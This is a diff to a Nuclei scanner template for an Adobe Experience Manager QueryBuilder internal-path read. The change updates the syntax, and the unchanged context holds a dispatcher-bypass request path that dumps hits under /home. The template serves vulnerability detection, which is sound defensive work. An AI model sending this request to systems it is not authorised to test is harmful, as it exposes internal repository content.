@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: aem-querybuilder-internal-path-read
 info:
   author: DhiyaneshDk
@@ -5,7 +6,7 @@ info:
   severity: medium
   reference: https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide=91
   tags: aem
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1'
